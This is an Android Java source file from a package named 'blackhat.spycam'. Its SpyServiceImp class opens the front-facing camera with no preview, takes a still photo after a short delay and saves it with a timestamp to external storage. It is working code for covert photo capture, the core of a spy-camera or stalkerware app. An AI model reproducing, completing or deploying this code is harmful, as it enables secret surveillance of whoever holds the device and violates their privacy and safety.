package com.blackhat.spycam;

import android.Manifest;
import android.annotation.TargetApi;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CameraMetadata;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.util.Log;
import android.util.Size;
import android.util.SparseIntArray;
import android.view.Surface;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;
import java.util.Queue;
import java.util.TreeMap;


@TargetApi(Build.VERSION_CODES.LOLLIPOP) //NOTE: camera 2 api was added in API level 21
public class SpyServiceImp extends SpyService {

    private static final String TAG = SpyServiceImp.class.getSimpleName();

    private CameraDevice cameraDevice;
    private ImageReader imageReader;
    /***
     * camera ids queue.
     */
    private Queue<String> cameraIds;
    private String currentCameraId;
    private boolean cameraClosed;
    /**
     * stores a sorted map of (pictureUrlOnDisk, PictureData).
     */
    private TreeMap<String, byte[]> picturesTaken;
    private SpyListener capturingListener;
    private String dir;

    /***
     * private constructor, meant to force the use of {@link #getInstance}  method
     */
    private SpyServiceImp(final Activity activity,final String dir) {
        super(activity);
        this.dir = dir;
    }

    /**
     * @param activity the activity used to get the app's context and the display manager
     * @return a new instance
     */
    public static SpyService getInstance(final Activity activity,final String dir) {
        return new SpyServiceImp(activity,dir);
    }

    /**
     * starts pictures capturing process.
     *
     * @param listener picture capturing listener
     */
    public void startCapturing(final SpyListener listener) {
        this.picturesTaken = new TreeMap<>();
        this.capturingListener = listener;
        this.cameraIds = new LinkedList<>();
        try {
            final String[] cameraIds = manager.getCameraIdList();
            if (cameraIds.length > 0) {
                this.cameraIds.add("1");
                this.currentCameraId = this.cameraIds.poll();
                openCamera();
            } else {
                //No camera detected!
                capturingListener.onDoneCapturingAllPhotos(picturesTaken);
            }
        } catch (final CameraAccessException e) {
            Log.e(TAG, "Exception occurred while accessing the list of cameras", e);
        }
    }

    private void openCamera() {
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                    == PackageManager.PERMISSION_GRANTED
                    && ActivityCompat.checkSelfPermission(context,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED) {
                manager.openCamera("1", stateCallback, null);
            }
        } catch (final CameraAccessException e) {
            Log.e(TAG, " exception occurred while opening camera " + currentCameraId, e);
        }
    }

    private final CameraCaptureSession.CaptureCallback captureListener = new CameraCaptureSession.CaptureCallback() {
        @Override
        public void onCaptureCompleted(@NonNull CameraCaptureSession session, @NonNull CaptureRequest request,
                                       @NonNull TotalCaptureResult result) {
            super.onCaptureCompleted(session, request, result);
            if (picturesTaken.lastEntry() != null) {
                capturingListener.onCaptureDone(picturesTaken.lastEntry().getKey(), picturesTaken.lastEntry().getValue());
                Log.i(TAG, "done taking picture from camera " + cameraDevice.getId());
            }
            closeCamera();
        }
    };


    private final ImageReader.OnImageAvailableListener onImageAvailableListener = (ImageReader imReader) -> {
        final Image image = imReader.acquireLatestImage();
        final ByteBuffer buffer = image.getPlanes()[0].getBuffer();
        final byte[] bytes = new byte[buffer.capacity()];
        buffer.get(bytes);
        saveImageToDisk(bytes);
        image.close();
    };

    private final CameraDevice.StateCallback stateCallback = new CameraDevice.StateCallback() {
        @Override
        public void onOpened(@NonNull CameraDevice camera) {
            cameraClosed = false;
            cameraDevice = camera;
            //Take the picture after some delay. It may resolve getting a black dark photos.
            new Handler().postDelayed(() -> {
                try {
                    takePicture();
                } catch (final CameraAccessException e) {
                    Log.e(TAG, " exception occurred while taking picture from " + currentCameraId, e);
                }
            }, 500);
        }

        @Override
        public void onDisconnected(@NonNull CameraDevice camera) {
            Log.d(TAG, " camera " + camera.getId() + " disconnected");
            if (cameraDevice != null && !cameraClosed) {
                cameraClosed = true;
                cameraDevice.close();
            }
        }

        @Override
        public void onClosed(@NonNull CameraDevice camera) {
            cameraClosed = true;
            Log.d(TAG, "camera " + camera.getId() + " closed");
            //once the current camera has been closed, start taking another picture
            if (!cameraIds.isEmpty()) {
                takeAnotherPicture();
            } else {
                capturingListener.onDoneCapturingAllPhotos(picturesTaken);
            }
        }


        @Override
        public void onError(@NonNull CameraDevice camera, int error) {
            Log.e(TAG, "camera in error, int code " + error);
            if (cameraDevice != null && !cameraClosed) {
                cameraDevice.close();
            }
        }
    };


    private void takePicture() throws CameraAccessException {
        if (null == cameraDevice) {
            Log.e(TAG, "cameraDevice is null");
            return;
        }
        final CameraCharacteristics characteristics = manager.getCameraCharacteristics(cameraDevice.getId());
        Size[] jpegSizes = null;
        StreamConfigurationMap streamConfigurationMap = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
        if (streamConfigurationMap != null) {
            jpegSizes = streamConfigurationMap.getOutputSizes(ImageFormat.JPEG);
        }
        final boolean jpegSizesNotEmpty = jpegSizes != null && 0 < jpegSizes.length;
        int width = jpegSizesNotEmpty ? jpegSizes[0].getWidth() : 640;
        int height = jpegSizesNotEmpty ? jpegSizes[0].getHeight() : 480;
        final ImageReader reader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1);
        final List<Surface> outputSurfaces = new ArrayList<>();
        outputSurfaces.add(reader.getSurface());
        final CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
        captureBuilder.addTarget(reader.getSurface());
        captureBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
        captureBuilder.set(CaptureRequest.JPEG_ORIENTATION, 270);
        reader.setOnImageAvailableListener(onImageAvailableListener, null);
        cameraDevice.createCaptureSession(outputSurfaces, new CameraCaptureSession.StateCallback() {
                    @Override
                    public void onConfigured(@NonNull CameraCaptureSession session) {
                        try {
                            session.capture(captureBuilder.build(), captureListener, null);
                        } catch (CameraAccessException e) {
                            Log.e(TAG, " exception occurred while accessing " + currentCameraId, e);
                        }
                    }

                    @Override
                    public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                    }
                }
                , null);
    }


    private void saveImageToDisk(final byte[] bytes) {
        File myDir = new File(Environment.getExternalStorageDirectory(),dir);
        if(!myDir.exists()){
            myDir.mkdir();
        }
        final File file = new File(myDir, String.valueOf(System.currentTimeMillis())+".jpg");
        //final File file = new File(Environment.getExternalStorageDirectory() + "/" + this.cameraDevice.getId() + "_pic.jpg");
        try (final OutputStream output = new FileOutputStream(file)) {
            output.write(bytes);
            this.picturesTaken.put(file.getPath(), bytes);
        } catch (IOException e) {
            Log.e(TAG, "Exception occurred while saving picture to external storage ", e);
        }
    }

    private void takeAnotherPicture() {
        this.currentCameraId = this.cameraIds.poll();
        openCamera();
    }

    private void closeCamera() {
        Log.d(TAG, "closing camera " + cameraDevice.getId());
        if (null != cameraDevice && !cameraClosed) {
            cameraDevice.close();
            cameraDevice = null;
        }
        if (null != imageReader) {
            imageReader.close();
            imageReader = null;
        }
    }


    public abstract static class APictureCapturingService {

        private static final SparseIntArray ORIENTATIONS = new SparseIntArray();

        static {
            ORIENTATIONS.append(Surface.ROTATION_0, 90);
            ORIENTATIONS.append(Surface.ROTATION_90, 0);
            ORIENTATIONS.append(Surface.ROTATION_180, 270);
            ORIENTATIONS.append(Surface.ROTATION_270, 180);
        }

        private final Activity activity;
        final Context context;
        final CameraManager manager;

        APictureCapturingService(final Activity activity) {
            this.activity = activity;
            this.context = activity.getApplicationContext();
            this.manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        }

        /***
         * @return  orientation
         */
        int getOrientation() {
            final int rotation = this.activity.getWindowManager().getDefaultDisplay().getRotation();
            return ORIENTATIONS.get(rotation);
        }


        /**
         * starts pictures capturing process.
         *
         * @param listener picture capturing listener
         */
        public abstract void startCapturing(final SpyListener listener);
    }
}
